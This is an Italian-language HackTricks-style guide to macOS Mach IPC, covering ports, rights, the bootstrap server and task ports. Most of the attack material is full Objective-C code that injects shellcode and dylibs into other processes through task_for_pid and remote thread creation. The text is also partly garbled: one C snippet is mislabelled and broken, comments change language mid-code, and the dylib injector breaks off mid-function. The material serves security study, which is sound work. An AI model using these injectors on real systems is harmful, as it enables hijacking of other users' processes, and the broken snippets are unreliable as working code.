# macOS IPC - Comunicazione tra processi

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Mach messaging tramite porte

### Informazioni di base

Mach utilizza **task** come **unità più piccola** per la condivisione delle risorse, e ogni task può contenere **più thread**. Questi **task e thread sono mappati 1:1 su processi e thread POSIX**.

La comunicazione tra i task avviene tramite la Comunicazione tra Processi Mach (IPC), utilizzando canali di comunicazione unidirezionali. **I messaggi vengono trasferiti tra le porte**, che agiscono come **code di messaggi** gestite dal kernel.

Ogni processo ha una **tabella IPC**, in cui è possibile trovare le **porte Mach del processo**. Il nome di una porta Mach è in realtà un numero (un puntatore all'oggetto del kernel).

Un processo può anche inviare un nome di porta con alcuni diritti **a un task diverso** e il kernel farà apparire questa voce nella **tabella IPC dell'altro task**.

### Diritti di porta

I diritti di porta, che definiscono le operazioni che un task può eseguire, sono fondamentali per questa comunicazione. I possibili **diritti di porta** sono ([definizioni da qui](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Diritto di ricezione**, che consente di ricevere messaggi inviati alla porta. Le porte Mach sono code MPSC (multiple-producer, single-consumer), il che significa che può esserci **solo un diritto di ricezione per ogni porta** in tutto il sistema (a differenza delle pipe, in cui più processi possono tutti detenere descrittori di file per l'estremità di lettura di una pipe).
* Un **task con il diritto di ricezione** può ricevere messaggi e **creare diritti di invio**, consentendo di inviare messaggi. Originariamente solo il **proprio task ha il diritto di ricezione sulla sua porta**.
* **Diritto di invio**, che consente di inviare messaggi alla porta.
* Il diritto di invio può essere **clonato** in modo che un task che possiede un diritto di invio possa clonare il diritto e **concederlo a un terzo task**.
* **Diritto di invio una volta**, che consente di inviare un solo messaggio alla porta e poi scompare.
* **Diritto di insieme di porte**, che indica un _insieme di porte_ anziché una singola porta. Estrarre un messaggio da un insieme di porte estrae un messaggio da una delle porte che contiene. Gli insiemi di porte possono essere utilizzati per ascoltare su più porte contemporaneamente, molto simili a `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Nome morto**, che non è un vero e proprio diritto di porta, ma solo un segnaposto. Quando una porta viene distrutta, tutti i diritti di porta esistenti per la porta diventano nomi morti.

**I task possono trasferire diritti di INVIO ad altri**, consentendo loro di inviare messaggi indietro. **I diritti di INVIO possono anche essere clonati, quindi un task può duplicare e dare il diritto a un terzo task**. Questo, combinato con un processo intermedio noto come **bootstrap server**, consente una comunicazione efficace tra i task.

### Stabilire una comunicazione

#### Passaggi:

Come accennato, per stabilire il canale di comunicazione, è coinvolto il **bootstrap server** (**launchd** in mac).

1. Il task **A** inizia una **nuova porta**, ottenendo un **diritto di ricezione** nel processo.
2. Il task **A**, essendo il detentore del diritto di ricezione, **genera un diritto di invio per la porta**.
3. Il task **A** stabilisce una **connessione** con il **bootstrap server**, fornendo il **nome del servizio della porta** e il **diritto di invio** tramite una procedura nota come registrazione bootstrap.
4. Il task **B** interagisce con il **bootstrap server** per eseguire una **ricerca bootstrap per il servizio**. Se ha successo, il **server duplica il diritto di invio** ricevuto dal Task A e lo **trasmette al Task B**.
5. Una volta acquisito un diritto di invio, il task **B** è in grado di **formulare** un **messaggio** e inviarlo **al task A**.
6. Per una comunicazione bidirezionale di solito il task **B** genera una nuova porta con un **diritto di ricezione** e un **diritto di invio**, e dà il **diritto di invio al task A** in modo che possa inviare messaggi a TASK B (comunicazione bidirezionale).

Il bootstrap server **non può autenticare** il nome del servizio reclamato da un task. Ciò significa che un **task** potrebbe potenzialmente **fingere di essere qualsiasi task di sistema**, ad esempio reclamando falsamente un nome di servizio di autorizzazione e quindi approvando ogni richiesta.

Successivamente, Apple memorizza i **nomi dei servizi forniti dal sistema** in file di configurazione sicuri, situati in directory protette da SIP: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Accanto a ciascun nome di servizio, viene anche memorizzato il **binario associato**. Il bootstrap server creerà e conserverà un **diritto di ricezione per ciascuno di questi nomi di servizio**.

Per questi servizi predefiniti, il **processo di ricerca differisce leggermente**. Quando viene cercato un nome di servizio, launchd avvia il servizio in modo dinamico. Il nuovo flusso di lavoro è il seguente:

* Il task **B** inizia una **ricerca bootstrap** per un nome di servizio.
* **launchd** controlla se il task è in esecuzione e, se non lo è, lo **avvia**.
* Il task **A** (il servizio) esegue un **check-in bootstrap**. Qui, il **bootstrap** server crea un diritto di invio, lo trattiene e **trasferisce il diritto di ricezione al task A**.
* launchd duplica il **diritto di invio e lo invia al task B**.
* Il task **B** genera una nuova porta con un **diritto di ricezione** e un **diritto di invio**, e dà il **diritto di invio al task A** (il svc) in modo che possa inviare messaggi a TASK B (comunicazione bidirezionale).

Tuttavia, questo processo si applica solo ai task di sistema predefiniti. I task non di sistema continuano a funzionare come descritto originariamente, il che potrebbe potenzialmente consentire l'usurpazione di identità. 

### Un messaggio Mach

[Trova ulteriori informazioni qui](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

La funzione `mach_msg`, essenzialmente una chiamata di sistema, viene utilizzata per inviare e ricevere messaggi Mach. La funzione richiede che il messaggio venga inviato come argomento iniziale. Questo messaggio deve iniziare con una struttura `mach_msg_header_t`, seguita dal contenuto effettivo del messaggio. La struttura è definita come segue:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
I processi che possiedono un _**diritto di ricezione**_ possono ricevere messaggi su una porta Mach. Al contrario, i **mittenti** ottengono un _**diritto di invio**_ o un _**diritto di invio una volta**_. Il diritto di invio una volta è esclusivamente per l'invio di un singolo messaggio, dopo il quale diventa invalido.

Per ottenere una **comunicazione bidirezionale** semplice, un processo può specificare una **porta Mach** nell'**intestazione del messaggio Mach** chiamata _porta di risposta_ (**`msgh_local_port`**) dove il **ricevitore** del messaggio può **inviare una risposta** a questo messaggio. I bitflag in **`msgh_bits`** possono essere utilizzati per **indicare** che un **diritto di invio una volta** dovrebbe essere derivato e trasferito per questa porta (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Si noti che questo tipo di comunicazione bidirezionale viene utilizzato nei messaggi XPC che si aspettano una risposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Ma **di solito vengono creati porti diversi** come spiegato in precedenza per creare la comunicazione bidirezionale.
{% endhint %}

Gli altri campi dell'intestazione del messaggio sono:

* `msgh_size`: la dimensione dell'intero pacchetto.
* `msgh_remote_port`: la porta su cui viene inviato questo messaggio.
* `msgh_voucher_port`: [buoni Mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: l'ID di questo messaggio, che viene interpretato dal ricevitore.

{% hint style="danger" %}
Si noti che i **messaggi Mach vengono inviati su una **_**porta Mach**_, che è un canale di comunicazione **singolo ricevitore**, **multiplo mittente** incorporato nel kernel Mach. **Più processi** possono **inviare messaggi** a una porta Mach, ma in ogni momento solo **un singolo processo può leggere** da essa.
{% endhint %}

### Enumerare le porte
```bash
lsmp -p <pid>
```
Puoi installare questo strumento su iOS scaricandolo da [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Esempio di codice

Nota come il **mittente** **alloca** una porta, crea un **diritto di invio** per il nome `org.darlinghq.example` e lo invia al **bootstrap server** mentre il mittente richiede il **diritto di invio** di quel nome e lo usa per **inviare un messaggio**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>

#define BUFFER_SIZE 100

int main(int argc, char** argv) {
    mach_port_t server_port;
    kern_return_t kr;
    char buffer[BUFFER_SIZE];

    // Create a send right to the bootstrap port
    kr = bootstrap_look_up(bootstrap_port, "com.apple.securityd", &server_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to look up the securityd service: %s\n", mach_error_string(kr));
        return 1;
    }

    // Send a message to the securityd service
    strcpy(buffer, "Hello, securityd!");
    kr = mach_msg((mach_msg_header_t*)&buffer, MACH_SEND_MSG, sizeof(buffer), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        printf("Failed to send message to securityd: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("Message sent to securityd\n");

    return 0;
}
```
{% endtab %}

{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Porte privilegiate

* **Porta host**: se un processo ha il **privilegio di invio** su questa porta, può ottenere **informazioni** sul **sistema** (ad esempio, `host_processor_info`).
* **Porta host priv**: un processo con il **diritto di invio** su questa porta può eseguire **azioni privilegiate** come caricare un'estensione del kernel. Il **processo deve essere root** per ottenere questa autorizzazione.
* Inoltre, per chiamare l'API **`kext_request`**, è necessario avere altri diritti **`com.apple.private.kext*`**, che vengono concessi solo ai binari Apple.
* **Porta nome attività**: una versione non privilegiata della _porta attività_. Fa riferimento all'attività, ma non consente di controllarla. L'unica cosa che sembra essere disponibile attraverso di essa è `task_info()`.
* **Porta attività** (alias porta kernel)**:** con il permesso di invio su questa porta è possibile controllare l'attività (leggere/scrivere memoria, creare thread...).
* Chiamare `mach_task_self()` per **ottenere il nome** di questa porta per l'attività chiamante. Questa porta viene ereditata solo attraverso **`exec()`**; una nuova attività creata con `fork()` ottiene una nuova porta attività (come caso speciale, un'attività ottiene anche una nuova porta attività dopo `exec()` in un binario suid). L'unico modo per generare un'attività e ottenere la sua porta è eseguire la ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) durante un `fork()`.
* Queste sono le restrizioni per accedere alla porta (da `macos_task_policy` dal binario `AppleMobileFileIntegrity`):
* Se l'app ha il diritto **`com.apple.security.get-task-allow`**, i processi dello **stesso utente possono accedere alla porta dell'attività** (comunemente aggiunto da Xcode per il debug). Il processo di **notarizzazione** non lo permetterà per le versioni di produzione.
* Le app con il diritto **`com.apple.system-task-ports`** possono ottenere la **porta dell'attività per qualsiasi** processo, tranne il kernel. Nelle versioni precedenti era chiamato **`task_for_pid-allow`**. Questo viene concesso solo alle applicazioni Apple.
* **Root può accedere alle porte delle attività** delle applicazioni **non** compilato con un runtime **harden** (e non da Apple).

### Iniezione di shellcode nel thread tramite porta attività&#x20;

Puoi ottenere uno shellcode da:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compila** il programma precedente e aggiungi i **diritti** per poter iniettare il codice con lo stesso utente (altrimenti dovrai usare **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Iniezione di Dylib nel thread tramite porta Task

In macOS, i **thread** possono essere manipolati tramite **Mach** o utilizzando l'API **posix `pthread`**. Il thread generato nell'iniezione precedente è stato generato utilizzando l'API Mach, quindi **non è conforme a posix**.

È stato possibile **iniettare un semplice shellcode** per eseguire un comando perché non era necessario lavorare con API conformi a posix, ma solo con Mach. **Iniezioni più complesse** richiederebbero che il **thread** sia anche **conforme a posix**.

Pertanto, per **migliorare il thread**, dovrebbe chiamare **`pthread_create_from_mach_thread`**, che creerà un pthread valido. Quindi, questo nuovo pthread potrebbe **chiamare dlopen** per **caricare una dylib** dal sistema, quindi anziché scrivere nuovo shellcode per eseguire diverse azioni, è possibile caricare librerie personalizzate.

Puoi trovare **esempi di dylib** in (ad esempio, quella che genera un log e poi puoi ascoltarlo):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossibile impostare i permessi di memoria per il codice del thread remoto: Errore %s\n", mach_error_string(kr));
return (-4);
}

// Imposta i permessi sulla memoria dello stack allocata
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Impossibile impostare i permessi di memoria per lo stack del thread remoto: Errore %s\n", mach_error_string(kr));
return (-4);
}


// Crea il thread per eseguire lo shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // questo è lo stack reale
//remoteStack64 -= 8;  // necessita di un allineamento di 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
